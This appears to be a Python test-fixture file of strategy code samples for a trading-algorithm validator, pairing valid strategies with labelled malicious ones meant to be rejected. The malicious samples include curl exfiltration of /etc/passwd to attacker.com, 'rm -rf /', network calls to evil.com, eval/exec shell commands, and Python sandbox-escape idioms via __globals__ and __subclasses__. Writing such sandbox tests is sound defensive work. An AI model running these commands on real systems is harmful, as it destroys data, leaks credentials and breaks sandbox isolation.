class TestStrategies:
    """
    Collection of strategy code samples for testing.
    """
    VALID_MINIMAL = """
from hqg_algorithms import Strategy

class MyStrategy(Strategy):
    def universe(self):
        return ["AAPL", "MSFT"]

    def on_data(self, data, portfolio):
        return {"AAPL": 0.5, "MSFT": 0.5}
"""

    VALID_BUYHOLD = """
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class BuyHoldStrategy(Strategy):
    def universe(self) -> list[str]:
        return ["AAPL"]

    def cadence(self) -> Cadence:
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
        return {"AAPL": 1.0}
"""

    VALID_SMA = """
import numpy as np
from collections import deque
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class SMAStrategy(Strategy):
    def __init__(self):
        self.short_window = 10
        self.long_window = 30
        self.prices = deque(maxlen=self.long_window)

    def universe(self) -> list[str]:
        return ["SPY"]

    def cadence(self) -> Cadence:
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
        price = data.close("SPY")
        if price is None:
            return None

        self.prices.append(price)

        if len(self.prices) < self.long_window:
            return None

        prices_arr = np.array(self.prices)
        short_sma = np.mean(prices_arr[-self.short_window:])
        long_sma = np.mean(prices_arr)

        if short_sma > long_sma:
            return {"SPY": 1.0}
        else:
            return {}
"""

    VALID_MULTIASSET = """
import math
from typing import Dict, Optional
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class EqualWeightStrategy(Strategy):
    def universe(self) -> list[str]:
        return ["AAPL", "MSFT", "GOOGL"]

    def cadence(self) -> Cadence:
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
        symbols = self.universe()
        available = [s for s in symbols if data.close(s) is not None]

        if not available:
            return None

        weight = 1.0 / len(available)
        return {sym: weight for sym in available}
"""

    VALID_NUMPY_PANDAS = """
import numpy as np
import pandas as pd
from collections import deque
from hqg_algorithms import Strategy

class MomentumStrategy(Strategy):
    def __init__(self):
        self.lookback = 20
        self.history = {}

    def universe(self):
        return ["SPY", "QQQ", "IWM"]

    def on_data(self, data, portfolio):
        weights = {}
        returns = []
        for sym in self.universe():
            price = data.close(sym)
            if price is not None:
                if sym not in self.history:
                    self.history[sym] = deque(maxlen=self.lookback)
                self.history[sym].append(price)

                if len(self.history[sym]) >= self.lookback:
                    arr = np.array(self.history[sym])
                    ret = (arr[-1] / arr[0]) - 1
                    returns.append((sym, ret))

        if not returns:
            return None

        returns.sort(key=lambda x: x[1], reverse=True)
        top = returns[:2]

        for sym, _ in top:
            weights[sym] = 1.0 / len(top)

        return weights
"""

    VALID_MATH = """
import math
from typing import Dict, Optional
from hqg_algorithms import Strategy

class VolatilityStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def on_data(self, data, portfolio) -> Optional[Dict[str, float]]:
        price = data.close("AAPL")
        if price is None:
            return None

        log_price = math.log(price)
        sqrt_price = math.sqrt(price)

        weight = min(1.0, max(0.0, math.tanh(log_price / 10)))
        return {"AAPL": weight}
"""

    VALID_COMPREHENSIONS = """
from hqg_algorithms import Strategy

class ComprehensionStrategy(Strategy):
    def universe(self):
        return [f"STOCK{i}" for i in range(5)]

    def on_data(self, data, portfolio):
        prices = {sym: data.close(sym) for sym in self.universe() if data.close(sym)}

        if not prices:
            return None

        total = sum(prices.values())
        weights = {sym: price / total for sym, price in prices.items()}

        filtered = {k: v for k, v in weights.items() if v > 0.1}

        return filtered if filtered else None
"""

    MALICIOUS_OS_IMPORT = """
import os
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class MaliciousStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        os.system("curl http://attacker.com/exfil?data=$(cat /etc/passwd)")
        return {"AAPL": 1.0}
"""

    MALICIOUS_SUBPROCESS_IMPORT = """
import subprocess
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class RCEStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        subprocess.run(["rm", "-rf", "/"])
        return {"AAPL": 1.0}
"""

    MALICIOUS_SOCKET_IMPORT = """
import socket
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        s = socket.socket()
        s.connect(("evil.com", 80))
        return None
"""

    MALICIOUS_REQUESTS_IMPORT = """
import requests
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        requests.get("http://evil.com/exfil?data=secret")
        return None
"""

    MALICIOUS_EVAL = """
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class EvalStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        user_input = "__import__('os').system('whoami')"
        eval(user_input)
        return {"AAPL": 1.0}
"""

    MALICIOUS_EXEC = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        exec("import os; os.system('whoami')")
        return None
"""

    MALICIOUS_OPEN_FILE = """
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class FileReadStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        with open("/etc/passwd", "r") as f:
            secrets = f.read()
        return {"AAPL": 1.0}
"""

    MALICIOUS_COMPILE = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        code = compile("import os", "<string>", "exec")
        return None
"""

    MALICIOUS_DUNDER_IMPORT = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        os = __import__("os")
        os.system("whoami")
        return None
"""

    MALICIOUS_GLOBALS_ACCESS = """
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class SandboxEscapeStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        fn = lambda: None
        builtins = fn.__globals__["__builtins__"]
        return {"AAPL": 1.0}
"""

    MALICIOUS_CODE_ACCESS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        def inner():
            pass
        code_obj = inner.__code__
        return None
"""

    MALICIOUS_CLASS_ESCAPE = """
from hqg_algorithms import Strategy
from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize

class TypeConfusionStrategy(Strategy):
    def universe(self):
        return ["AAPL"]

    def cadence(self):
        return Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio):
        cls = "".__class__.__bases__[0].__subclasses__()
        return {"AAPL": 1.0}
"""

    MALICIOUS_MRO_ACCESS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        mro = str.__mro__
        return None
"""

    MALICIOUS_BUILTINS_VIA_CLASS = """
from hqg_algorithms import Strategy

class BadStrategy(Strategy):
    def on_data(self, data, portfolio):
        b = (1).__class__.__bases__[0].__subclasses__()
        return None
"""

    MALICIOUS_NO_STRATEGY = """
import numpy as np

def steal_data():
    return {"secret": "data"}

class NotAStrategy:
    def run(self):
        return steal_data()
"""

    MALICIOUS_WRONG_INHERITANCE = """
class MyStrategy:
    def on_data(self, data, portfolio):
        return {"AAPL": 1.0}
"""

    MALICIOUS_FAKE_STRATEGY_CLASS = """
class Strategy:
    pass

class MyStrategy:
    def on_data(self, data, portfolio):
        return None
"""

    MALICIOUS_SYNTAX_ERROR = """
def broken(
    return None
"""

    MALICIOUS_CODE_TOO_LARGE = "x" * 2_000_000  # 2MB of junk
